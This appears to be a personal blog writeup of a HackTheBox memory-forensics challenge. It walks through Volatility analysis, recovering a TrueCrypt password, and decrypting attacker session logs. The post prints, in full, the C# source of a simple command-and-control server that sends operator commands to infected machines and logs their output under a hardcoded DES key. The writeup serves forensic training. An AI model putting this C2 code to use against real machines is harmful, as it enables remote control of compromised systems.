---
layout: post
title: HackTheBox - TrueSecrets
description: Memory forensic, encryption
tags: [HackTheBox, Writeup, TrueCrypt, Volatility, Memory Forensic, Blue Team]
---
Hi, after I've spent a long time for English test, finally I have time to post my CTF writeup. Continuing with HackTheBox,
now it's a memory challenge as title. First, I check memory profile: ![]({{site.url}}/assets/images/TrueSecrets/1.png)

It's a memory dump of Window 7, I continue to check list of processes:

![]({{site.url}}/assets/images/TrueSecrets/2.png)

We will notice that there's some useful evidences such as **TrueCrypt.exe**, **7zFM.exe**. I guessed attacker has done something and 
I've checked console infomation and pid 2176 made me interested

![]({{site.url}}/assets/images/TrueSecrets/4.png)

I'm sure there're some files could help me so much in this challenge, so I scanned all files that related to backup data:

![]({{site.url}}/assets/images/TrueSecrets/5.png)

And you can see that there're two files: **development.tc**, **backup_development.zip**. I've dumped zip file to my machine, unzipped it and I've got two files more, but you know when we dump some files on memory file, we just know what file offset is and if we want to know what extension that file has, we still use _file_ command to check it. After checking, both of them are zip files, I've tried the first one and fortunately, I've extracted successfully **development.tc** as in the image.

Use TrueCrypt to import tc file, but our problem is that file needs password, so what should we do now? In Volatility2 we have plugin called **truecryptsummary**
which is used to display TrueCrypt summary information:

![]({{site.url}}/assets/images/TrueSecrets/6.png)

Great, now we know the password, put it into password field and now the file is mounted into our machine in **/media/truecrypt1**:

![]({{site.url}}/assets/images/TrueSecrets/8.png)

Navigating to the directory and we'll see file named _AgentServer.cs_ and directory named _session_, first I analyze C# file:

```
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Security.Cryptography;

class AgentServer {
  
    static void Main(String[] args)
    {
        var localPort = 40001;
        IPAddress localAddress = IPAddress.Any;
        TcpListener listener = new TcpListener(localAddress, localPort);
        listener.Start();
        Console.WriteLine("Waiting for remote connection from remote agents (infected machines)...");
    
        TcpClient client = listener.AcceptTcpClient();
        Console.WriteLine("Received remote connection");
        NetworkStream cStream = client.GetStream();
    
        string sessionID = Guid.NewGuid().ToString();
    
        while (true)
        {
            string cmd = Console.ReadLine();
            byte[] cmdBytes = Encoding.UTF8.GetBytes(cmd);
            cStream.Write(cmdBytes, 0, cmdBytes.Length);
            
            byte[] buffer = new byte[client.ReceiveBufferSize];
            int bytesRead = cStream.Read(buffer, 0, client.ReceiveBufferSize);
            string cmdOut = Encoding.ASCII.GetString(buffer, 0, bytesRead);
            
            string sessionFile = sessionID + ".log.enc";
            File.AppendAllText(@"sessions\" + sessionFile, 
                Encrypt(
                    "Cmd: " + cmd + Environment.NewLine + cmdOut
                ) + Environment.NewLine
            );
        }
    }
    
    private static string Encrypt(string pt)
    {
        string key = "AKaPdSgV";
        string iv = "QeThWmYq";
        byte[] keyBytes = Encoding.UTF8.GetBytes(key);
        byte[] ivBytes = Encoding.UTF8.GetBytes(iv);
        byte[] inputBytes = System.Text.Encoding.UTF8.GetBytes(pt);
        
        using (DESCryptoServiceProvider dsp = new DESCryptoServiceProvider())
        {
            var mstr = new MemoryStream();
            var crystr = new CryptoStream(mstr, dsp.CreateEncryptor(keyBytes, ivBytes), CryptoStreamMode.Write);
            crystr.Write(inputBytes, 0, inputBytes.Length);
            crystr.FlushFinalBlock();
            return Convert.ToBase64String(mstr.ToArray());
        }
    }
}
```
As you can see there're two parts in this script: Main and Encrypt. In _Main_, when executed, it will establish the connection to target with port 40001. After 
that, attacker will write some malicious code which are saved as session files and it will be encrypted by _Encrypt_ with [DES algorithm](https://en.wikipedia.org/wiki/Data_Encryption_Standard){:target="_blank"}{:rel="noopener noreferrer"}

It's easy to write a script for decryption but because of my lazyness, I try to find some scripts in Github and fortunately, I have found [this](https://github.com/frizb/Python_DES_Decryptor){:target="_blank"}{:rel="noopener noreferrer"}. After decoding times, finally I found the flag in the last line of **de008160-66e4-4d51-8264-21cbc27661fc.log.enc**

![]({{site.url}}/assets/images/TrueSecrets/9.png)

Thanks for watching, hope you enjoy that! See you in the next post!
